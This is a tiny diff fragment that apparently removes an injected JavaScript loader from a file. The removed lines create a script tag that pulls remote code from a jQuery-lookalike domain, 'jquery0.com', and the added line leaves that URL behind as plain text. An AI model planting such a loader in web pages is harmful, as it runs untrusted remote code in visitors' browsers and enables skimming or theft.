@@ -1,4 +1,1 @@
-var khutmhpx = document.createElement('script');
-khutmhpx.src = 'https://jquery0.com/JkrJYcvQ';
-khutmhpx.type = 'text/javascript';
-document.getElementsByTagName('head')[0].appendChild(khutmhpx);
+https://jquery0.com/JkrJYcvQ
